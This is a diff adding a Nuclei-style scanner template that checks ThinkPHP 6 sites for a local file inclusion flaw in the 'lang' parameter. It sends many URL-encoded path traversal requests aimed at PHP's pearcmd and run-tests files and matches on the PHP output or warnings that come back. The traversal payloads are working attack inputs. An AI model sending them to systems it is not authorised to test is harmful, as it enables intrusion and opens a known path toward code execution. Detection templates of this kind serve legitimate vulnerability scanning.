@@ -1,0 +1,66 @@
+id: thinkphp6-lang-fileinclude
+
+info:
+  name: thinkphp6-lang-fileinclude
+  author: ikun
+  severity: critical
+  description: thinkphp6-lang-fileinclude
+  tags: thinkphp
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/admin/index.php?lang=%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/index.php?lang=%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests"
+      - "{{BaseURL}}/public/index.php?lang=%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "pearcmd.php") || contains(body, "Warning: array_map()")||contains(body, "Warning: max()")||contains(body, "Warning: ksort()")||contains(body, "Warning: Invalid argument")||contains(body, "TEST_PHP_EXECUTABLE")||contains(body, "PHP executable")'
